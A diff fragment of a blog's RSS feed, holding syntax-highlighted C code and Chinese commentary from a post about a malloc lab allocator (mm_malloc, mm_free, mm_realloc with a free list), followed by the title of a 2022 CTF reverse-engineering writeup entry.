+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; DSIZE)
+        size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; DSIZE;
+    size_t newsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; DSIZE &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;size) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; DSIZE);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; bp;
+    &lt;span style=&#34;color:#75715e&#34;&gt;// int newsize = ALIGN(size + SIZE_T_SIZE);
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_fit(newsize)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL) {
+        place(bp, newsize);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
+    }
+    size_t extendsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MAX(newsize, CHUNKSIZE);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; extend_heap(extendsize&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;WSIZE)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+	   &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    place(bp, newsize);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_free - Freeing a block does nothing.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mm_free&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr)
+{
+    size_t size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(ptr));
+
+    PUT(HDRP(ptr), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+    PUT(FTRP(ptr), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+    insert_node_to_free_list(ptr, size);
+    coalesce(ptr);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在不优化 realloc 的情况下可以拿到 84 左右的分数，和 next fit 接近&lt;/p&gt;
+&lt;p&gt;简单优化一下 realloc，但由于 bug 实在太多，还是选择抄了一个只向后合并空闲块的 realloc（可以增加向前合并，但又得继续 debug，润了）&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这里踩到了一个坑，书上给的 extend_heap() 读入的是 words，而很多地方习惯直接给 byte 长度计算的 size 了，所以一直报“未进行复制”的错&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_realloc - Implemented simply in terms of mm_malloc and mm_free
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mm_realloc&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr, size_t size){
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;nblock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; reamin;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; DSIZE) size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; DSIZE;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ALIGN(size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((reamin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(ptr)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ptr;
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;GET_ALLOC(HDRP(NEXT_BLKP(ptr))) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;GET_SIZE(HDRP(NEXT_BLKP(ptr)))){
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((reamin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(ptr)) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; GET_SIZE(HDRP(NEXT_BLKP(ptr))) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (extend_heap(MAX(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;reamin, CHUNKSIZE)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;WSIZE) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+            reamin &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; MAX(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;reamin, CHUNKSIZE);
+        }
+        delete_node_from_free_list(NEXT_BLKP(ptr), GET_SIZE(HDRP(NEXT_BLKP(ptr))));
+        PUT(HDRP(ptr), PACK(size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; reamin, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+        PUT(FTRP(ptr), PACK(size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; reamin, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+        nblock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mm_malloc(size);
+        memcpy(nblock, ptr, GET_SIZE(HDRP(ptr)));
+        mm_free(ptr);
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; nblock;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
         <title>qwb 2022 rev writeups</title>
         <link>/post/qwb2022-rev-writeups/</link>
         <pubDate>Tue, 02 Aug 2022 23:23:23 +0800</pubDate>
